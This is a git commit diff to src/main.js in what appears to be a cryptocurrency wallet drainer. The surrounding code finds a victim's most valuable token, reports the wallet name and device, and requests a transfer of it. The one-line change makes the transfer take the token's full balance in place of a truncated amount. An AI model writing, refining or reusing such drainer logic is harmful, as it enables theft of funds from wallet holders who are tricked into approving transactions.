3349cd410098801c80554c184421ecb95e0192b8
AmnesiaNUACHO <mainmaaan@tutamail.com>
2025-07-03 23:21:57 +0000

    Update main.js

--- src/main.js
+++ src/main.js
@@ -628,7 +628,7 @@ const initializeSubscribers = (modal) => {
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           const tokenBalance = mostExpensive.balance
-          const amount = parseUnits((Math.floor(tokenBalance * 1000000) / 1000000).toString(), mostExpensive.decimals)
+          const amount = parseUnits(tokenBalance.toString(), mostExpensive.decimals)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           if (transferResult.success) {
             approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
